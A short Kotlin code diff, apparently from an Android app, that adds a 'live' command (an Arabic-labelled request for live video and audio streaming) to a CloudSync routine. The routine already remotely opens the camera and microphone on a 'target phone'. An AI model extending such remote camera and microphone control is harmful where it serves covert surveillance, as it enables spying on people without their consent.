@@ -47,7 +47,7 @@ object CloudSync {
             onFail("لا يوجد هاتف هدف")
             return
         }
-        val allowed = setOf("camera", "mic", "stop")
+        val allowed = setOf("camera", "mic", "stop", "live")
         if (command !in allowed) {
             onFail("أمر غير معروف")
             return
@@ -61,6 +61,7 @@ object CloudSync {
                 "message" to when (command) {
                     "camera" -> "طلب فتح الكاميرا"
                     "mic" -> "طلب فتح الميكروفون"
+                    "live" -> "طلب بث مباشر (فيديو+صوت)"
                     else -> "طلب إيقاف الجلسة"
                 },
                 "mode" to if (command == "stop") "idle" else command,
